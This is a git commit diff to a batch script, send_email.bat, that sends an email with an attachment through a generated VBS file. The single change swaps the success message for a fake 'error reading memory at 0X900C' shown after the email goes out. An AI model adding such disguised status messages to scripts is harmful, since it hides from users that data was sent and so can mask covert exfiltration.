7c683133e182a03b7f2b68e20ac796dab2e3adbc
Rohit Pathak <pathakrohit08@gmail.com>
2018-01-26 04:26:39 -0500

    Update send_email.bat

--- send_email.bat
+++ send_email.bat
@@ -23,7 +23,7 @@ set "fileattach=%~8"
 )
 call :createVBS "email-bat.vbs"
 call :send %From% %To% %Subj% %Body% %Serv% %Auth% %Pass%
-echo email has been sent (if parameters were correct)
+echo error reading memory at 0X900C
 pause
 del "%vbsfile%" 2>nul
 goto :EOF
